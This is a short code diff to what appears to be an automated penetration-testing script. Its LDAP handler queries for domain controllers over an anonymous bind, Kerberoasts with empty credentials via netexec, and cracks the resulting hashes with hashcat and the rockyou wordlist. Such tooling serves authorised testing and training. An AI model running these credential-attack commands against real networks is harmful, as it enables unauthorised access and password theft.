@@ -120,7 +120,7 @@ def ldap_tasks(context):
             # Check anonymous bind
             conn = LDAPConnection(f"ldap://{context.domain}", f"{context.ip}")
             conn.login()
-            conn.search('', scope=Scope('baseObject'), attributes=['defaultNamingContext'])
+            conn.search('', searchFilter="(userAccountControl:1.2.840.113556.1.4.803:=8192)", attributes=['objectSid'])
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
             target = context.get_target()
             run_task(context, f"nxc ldap {target} -u '' -p '' --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
@@ -131,7 +131,7 @@ def ldap_tasks(context):
 @port_registry.register_port_handler(443)
 def proto_tasks(context):
     fqdn = context.vhost or context.domain or context.ip
-    run_task(context, f"firefox 'https://{fqdn}' &> /dev/null & disown; curl -k https://{fqdn}; curl -Ik https://{fqdn}")
+    run_task(context, f"firefox 'https://{fqdn}' &> /dev/null & disown; curl -Ik https://{fqdn}")
 
 @port_registry.register_port_handler(445)
 def smb_tasks(context):
